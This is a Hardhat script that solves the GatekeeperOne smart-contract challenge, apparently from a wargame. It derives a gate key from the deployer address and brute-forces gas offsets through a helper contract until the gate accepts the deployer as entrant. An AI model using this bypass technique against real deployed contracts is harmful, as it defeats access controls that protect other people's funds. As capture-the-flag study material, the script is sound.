const { assert } = require("chai");
const { getNamedAccounts, network, ethers } = require("hardhat");

async function main() {
    const instanceAddress = "0x3a23b9E62280915D2f3f8C631654a2B3c7eE2a30";
    const chainId = network.config.chainId;
    const { deployer } = await getNamedAccounts();
    let gateKeeper;

    if (chainId === 31337) {
        //seems fixtures works in scripts too. nice
        await deployments.fixture(["GatekeeperOne"]);
        gateKeeper = await ethers.getContract("GatekeeperOne", deployer);
    } else {
        gateKeeper = await ethers.getContractAt(
            "GatekeeperOne",
            instanceAddress,
            deployer
        );
    }
    const brakeTheGate = await ethers.getContract("BrakeTheGate", deployer);

    const MOD = 8191;
    const gasToUse = 802900;

    console.log(typeof deployer);
    const gateKey =
        "0x100000000000" + deployer.slice(deployer.length - 4, deployer.length);
    console.log("gateKey", gateKey);

    for (let i = 0; i < MOD; i++) {
        console.log(`testing ${gasToUse + i}`);
        try {
            const tx = await brakeTheGate.brake(gateKey, gasToUse + i, {
                gasLimit: `950000`,
            });
            await tx.wait();
            console.log(`Winner gas value is: ${gasToUse + i}`);
            break;
        } catch {}
    }

    const entrant = await gateKeeper.entrant();
    assert.equal(entrant, deployer);
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
